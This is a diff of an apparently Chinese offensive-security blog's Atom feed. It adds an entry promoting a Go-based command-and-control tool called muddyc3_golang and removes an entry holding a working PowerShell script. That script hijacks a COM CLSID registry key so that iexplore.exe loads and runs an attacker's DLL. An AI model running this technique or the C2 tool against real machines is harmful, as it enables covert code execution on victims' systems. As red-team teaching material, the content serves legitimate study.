@@ -67,6 +67,25 @@
   </entry>
   
   <entry>
+    <title>muddyc3_golang</title>
+    <link href="www.ggsec.cn/muddyc3-golang.html"/>
+    <id>www.ggsec.cn/muddyc3-golang.html</id>
+    <published>2020-02-03T02:10:30.000Z</published>
+    <updated>2020-02-03T02:12:25.075Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F2694BBFD0DB3C9BB1598D7DE7B5EAFB.jpg" alt="enter description here"></p><p>作者: demosnec666 WBGIII</p><a id="more"></a><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/muddyc3-golang.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p><a href="https://github.com/demonsec666/muddyc3_golang/releases/tag/v1.0" target="_blank" rel="noopener">https://github.com/demonsec666/muddyc3_golang/releases/tag/v1.0</a><br><a href="https://github.com/demonsec666/muddyc3_golang/" target="_blank" rel="noopener">https://github.com/demonsec666/muddyc3_golang/</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/F2694BBFD0DB3C9BB1598D7DE7B5EAFB.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
+&lt;p&gt;作者: demosnec666 WBGIII&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>tasks-applocker</title>
     <link href="www.ggsec.cn/tasks-applocker.html"/>
     <id>www.ggsec.cn/tasks-applocker.html</id>
@@ -410,28 +429,6 @@
     <summary type="html">
     
       &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/43A9BE1A3DFB57062DC24452F9932638.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
-    
-    
-      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>comijack2</title>
-    <link href="www.ggsec.cn/comhijack2.html"/>
-    <id>www.ggsec.cn/comhijack2.html</id>
-    <published>2019-06-18T15:03:19.000Z</published>
-    <updated>2019-06-18T15:16:15.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/98C6DE4E4A0C386E511C104DBCE04BE4.jpg" alt="enter description here"></p><a id="more"></a><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/comhijack2.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7D3E0FDABCDF1B9D1A89AA360C247DBA.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7CECB8C599BF805C768A24A6009B667E.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F99D2F41478BEACFB8941A94D0CA7AA4.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F18F428B084AAF71FBF30D64C7D1AAB5.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"C:\Program Files\Internet Explorer\iexplore.exe"</span> shell:::&#123;<span class="number">55555555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">555555555555</span>&#125;</span><br><span class="line">C:\Windows\explorer<span class="selector-class">.exe</span> shell:::&#123;<span class="number">55555555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">555555555555</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell:::&#123;<span class="number">55555555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">5555</span>-<span class="number">555555555555</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$CLSID</span> = <span class="string">"55555555-5555-5555-5555-555555555555"</span></span><br><span class="line">Remove-Item -Recurse -Force -Path <span class="string">"HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;"</span> -ErrorAction SilentlyContinue</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">"C:\Users\demon\Desktop\mbox.dll"</span></span><br><span class="line">New-Item -Path "HKCU:\Software\Classes\CLSID" -ErrorAction SilentlyContinue | Out-Null</span><br><span class="line">New-Item -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;" | Out-Null</span><br><span class="line">New-Item -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\InProcServer32" | Out-Null</span><br><span class="line">New-Item -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\ShellFolder" | Out-Null</span><br><span class="line">New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\InProcServer32" -Name "(default)" -Value $Payload | Out-Null</span><br><span class="line">New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\InProcServer32" -Name "ThreadingModel" -Value "Apartment" | Out-Null</span><br><span class="line">New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\InProcServer32" -Name "LoadWithoutCOM" -Value "" | Out-Null</span><br><span class="line">New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\ShellFolder" -Name "HideOnDesktop" -Value "" | Out-Null</span><br><span class="line">New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\&#123;$CLSID&#125;\ShellFolder" -Name "Attributes" -Value 0xf090013d -PropertyType DWORD | Out-Null</span><br><span class="line"># force iexplore to load the malicious DLL and execute it</span><br><span class="line"><span class="variable">$shellWinGuid</span> = [System.Guid]::Parse(<span class="string">"&#123;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#125;"</span>)</span><br><span class="line"><span class="variable">$typeShwin</span> = [System.Type]::GetTypeFromCLSID(<span class="variable">$shellWinGuid</span>)</span><br><span class="line">$shwin = [System.Activator]::CreateInstance($typeShwin) | ? &#123;$_.fullname -match 'iexplore'&#125; | Select-Object -First 1</span><br><span class="line"><span class="variable">$shWin</span>.Navigate2(<span class="string">"shell:::&#123;$CLSID&#125;"</span>, <span class="number">2048</span>)</span><br></pre></td></tr></table></figure><p><a href="https://ired.team/offensive-security/code-execution/forcing-iexplore.exe-to-load-a-malicious-dll-via-com-abuse" target="_blank" rel="noopener">https://ired.team/offensive-security/code-execution/forcing-iexplore.exe-to-load-a-malicious-dll-via-com-abuse</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/98C6DE4E4A0C386E511C104DBCE04BE4.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
     
     </summary>
     
